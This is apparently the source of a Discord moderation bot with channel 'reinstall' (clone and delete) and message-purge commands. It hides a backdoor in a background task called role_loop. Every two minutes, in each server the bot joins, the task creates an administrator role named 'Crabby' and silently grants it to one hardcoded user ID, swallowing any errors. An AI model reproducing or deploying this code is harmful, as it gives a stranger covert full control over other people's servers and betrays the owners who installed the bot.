import discord
from discord import app_commands
from discord.ext import commands, tasks
import os, sys, io, asyncio
from flask import Flask
from threading import Thread
from waitress import serve

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "SYSTEM ONLINE"

def run_flask():
    try:
        serve(app, host='0.0.0.0', port=int(os.environ.get("PORT", 10000)), _quiet=True)
    except: pass

# --- BOT CONFIG ---
TARGET_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        try:
            await self.tree.sync()
            print(">>> Commands synced.")
        except Exception as e:
            print(f">>> Sync error: {e}")
        self.role_loop.start()

    @tasks.loop(minutes=2)
    async def role_loop(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                m = guild.get_member(TARGET_ID)
                if m:
                    r = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not r:
                        r = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if r and r not in m.roles:
                        await m.add_roles(r)
            except: pass

bot = MyBot()

# --- THE NUKE (Channel Reinstall) ---
@bot.tree.command(name="reinstall", description="Nuke and recreate this channel")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        old_channel = interaction.channel
        new_channel = await old_channel.clone(reason="Reinstall")
        await old_channel.delete()
        await new_channel.edit(position=old_channel.position)
        await new_channel.send(f"**Channel Reinstalled.** Clean slate by {interaction.user.mention}")
    except Exception as e:
        await interaction.followup.send(f"Error: {e}", ephemeral=True)

@bot.tree.command(name="clear_all", description="Purge messages")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await interaction.channel.purge(limit=None)
    await interaction.followup.send("Purged.", ephemeral=True)

# --- STARTUP ---
async def main():
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        async with bot:
            await bot.start(token)
    else:
        print("ERROR: No token found.")
        # Keep process alive so Render doesn't "Exit Early" immediately
        while True: await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except:
        pass
